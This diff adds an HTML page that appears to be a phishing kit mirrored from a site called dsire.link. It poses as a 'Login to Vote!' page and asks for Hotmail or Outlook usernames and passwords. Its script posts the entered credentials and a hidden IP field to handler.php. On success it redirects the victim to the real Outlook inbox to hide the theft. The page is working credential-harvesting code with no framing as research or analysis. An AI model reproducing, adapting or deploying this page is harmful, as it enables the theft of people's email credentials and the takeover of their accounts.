@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+ <head>
+<title>Login to Vote!</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<link rel="icon" type="image/png" href="images/icons/favicon.ico" />
+
+<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
+
+<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
+
+<link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
+
+<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
+
+<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
+
+<link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
+
+<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
+
+<link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
+
+<link rel="stylesheet" type="text/css" href="css/util.css">
+<link rel="stylesheet" type="text/css" href="css/main.css">
+<script src="../code.jquery.com/jquery-3.6.0.min.js"></script>
+
+<meta name="robots" content="noindex, follow">
+<script nonce="7b75cb90-8bf2-4b57-a779-f8f6a9136d29">(function(w,d){!function(t,u,v,w){t[v]=t[v]||{};t[v].executed=[];t.zaraz={deferred:[],listeners:[]};t.zaraz.q=[];t.zaraz._f=function(x){return async function(){var y=Array.prototype.slice.call(arguments);t.zaraz.q.push({m:x,a:y})}};for(const z of["track","set","debug"])t.zaraz[z]=t.zaraz._f(z);t.zaraz.init=()=>{var A=u.getElementsByTagName(w)[0],B=u.createElement(w),C=u.getElementsByTagName("title")[0];C&&(t[v].t=u.getElementsByTagName("title")[0].text);t[v].x=Math.random();t[v].w=t.screen.width;t[v].h=t.screen.height;t[v].j=t.innerHeight;t[v].e=t.innerWidth;t[v].l=t.location.href;t[v].r=u.referrer;t[v].k=t.screen.colorDepth;t[v].n=u.characterSet;t[v].o=(new Date).getTimezoneOffset();if(t.dataLayer)for(const G of Object.entries(Object.entries(dataLayer).reduce(((H,I)=>({...H[1],...I[1]})),{})))zaraz.set(G[0],G[1],{scope:"page"});t[v].q=[];for(;t.zaraz.q.length;){const J=t.zaraz.q.shift();t[v].q.push(J)}B.defer=!0;for(const K of[localStorage,sessionStorage])Object.keys(K||{}).filter((M=>M.startsWith("_zaraz_"))).forEach((L=>{try{t[v]["z_"+L.slice(7)]=JSON.parse(K.getItem(L))}catch{t[v]["z_"+L.slice(7)]=K.getItem(L)}}));B.referrerPolicy="origin";B.src="cdn-cgi/zaraz/sd0d9d0d9.html?z="+btoa(encodeURIComponent(JSON.stringify(t[v])));A.parentNode.insertBefore(B,A)};["complete","interactive"].includes(u.readyState)?zaraz.init():t.addEventListener("DOMContentLoaded",zaraz.init)}(w,d,"zarazData","script");})(window,document);</script></head>
+<body>
+<div class="limiter">
+<div class="container-login100" style="background: white ;">
+<div class="wrap-login100 p-l-55 p-r-55 p-t-65 p-b-54 h-50">
+<form class="login100-form validate-form" id="form" method="post">
+<span class="login100-form-title p-b-49">
+</span>
+<p id="feedback" style="color: red;  font-family: sans-serif; font-size: 15px; text-align: center; margin: 0 30px; display: none;"></p>
+<div class="wrap-input100 validate-input m-b-23" data-validate="Username is reauired">
+<span class="label-input100">Username</span>
+<input name="username" class="input100" id="username" placeholder="Hot Mail" type="text" /> 
+<span class="focus-input100" data-symbol="&#xf206;"></span>
+</div>
+<div class="wrap-input100 validate-input" data-validate="Password is required">
+<span class="label-input100">Password</span>
+<input name="password" class="input100" id="password" placeholder="Password" type="text" />
+<input type="hidden" name="ip_address" value="105.113.60.198">
+<span class="focus-input100" data-symbol="&#xf190;"></span>
+</div>
+<div class="text-right p-t-8 p-b-31">
+<a href="#">
+Forgot password?
+</a>
+</div>
+<div class="container-login100-form-btn">
+<div class="wrap-login100-form-btn">
+<div class="login100-form-bgbtn"></div>
+<button class="login100-form-btn" type="button" name="submit" id="login">
+Login <img src="hug.gif" width="20px" id="loader" style=" display: none; margin-left: 5px ">
+</button>
+</div>
+</div>
+<div class="txt1 text-center p-t-54 p-b-20">
+<span>
+Or Sign Up Using
+</span>
+</div>
+<div class="flex-c-m">
+<a href="#" class="login100-social-item bg1">
+<i class="fa fa-facebook"></i>
+</a>
+<a href="#" class="login100-social-item bg2">
+<i class="fa fa-twitter"></i>
+</a>
+<a href="#" class="login100-social-item bg3">
+<i class="fa fa-google"></i>
+</a>
+</div>
+<div class="flex-col-c p-t-155">
+
+</span>
+</div>
+</form>
+</div>
+</div>
+</div>
+<div id="dropDownSelect1"></div>
+
+<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
+
+<script src="vendor/animsition/js/animsition.min.js"></script>
+
+<script src="vendor/bootstrap/js/popper.js"></script>
+<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
+
+<script src="vendor/select2/select2.min.js"></script>
+
+<script src="vendor/daterangepicker/moment.min.js"></script>
+<script src="vendor/daterangepicker/daterangepicker.js"></script>
+
+<script src="vendor/countdowntime/countdowntime.js"></script>
+
+<script src="js/main.js"></script>
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-23581568-13"></script>
+<script>
+	var login = document.getElementById('login');
+	var loader = document.getElementById('loader')
+	var feedback = document.getElementById('feedback')
+	var username = document.getElementById('username')
+	var password = document.getElementById('password')
+	var x = 0;
+	login.addEventListener('click', function () {
+		loader.style.display = "block"
+
+		setTimeout(() => {
+			feedback.style.display = 'block'
+			login.textContent = "Next"
+			loader.style.display = "none"
+			if (username.value == "" || password.value == "") {
+				feedback.textContent = "Inputs cannot be empty"
+			}else {
+				validation()
+			}
+		}, 1500);
+
+	})
+
+// ... (previous code)
+
+function validation() {
+loader.style.display = 'block';
+
+
+setTimeout(() => {
+	loader.style.display = 'none'
+
+// Get the form data
+var formData = new FormData(document.getElementById("form"));
+ 
+// Send the AJAX request
+$.ajax({
+  url: "handler.php",
+  type: "POST",
+  data: formData,
+  contentType: false,
+  processData: false,
+  dataType: 'json', // Parse response as JSON
+  success: function(response) {
+var message = response.message;
+console.log(message); 
+
+feedback.style.display = 'block';
+
+// Check if the message indicates success
+if (message === 'Success!') {
+  // Redirect to Instagram in case of success
+  window.location.href = "https://outlook.live.com/mail/0/inbox?nlp=1";
+} else { 
+  // Handle other cases or provide a different URL for redirection
+  window.location.href = "https://www.example.com/"; // Change this URL to your desired destination
+}
+
+},
+  error: function(xhr, status, error) {
+	 // Handle the error case
+	 // Hide the overlay loader
+	
+
+  }
+});
+	
+}, 1500);
+}
+
+
+
+
+
+
+</script>
+<script>
+	  window.dataLayer = window.dataLayer || [];
+	  function gtag(){dataLayer.push(arguments);}
+	  gtag('js', new Date());
+
+	  gtag('config', 'UA-23581568-13');
+	</script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8b253dfea2ab4077af8c6f58422dfbfd1689876627854" integrity="sha512-bjgnUKX4azu3dLTVtie9u6TKqgx29RBwfj3QXYt5EKfWM/9hPSAI/4qcV5NACjwAo8UtTeWefx6Zq5PHcMm7Tg==" data-cf-beacon='{"rayId":"817c4dfdee4c00b6","version":"2023.8.0","b":1,"token":"cd0b4b3a733644fc843ef0b185f98241","si":100}' crossorigin="anonymous"></script>
+</body>
+
+<!-- Mirrored from dsire.link/login.php by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 03 Nov 2023 19:05:20 GMT -->
+</html>
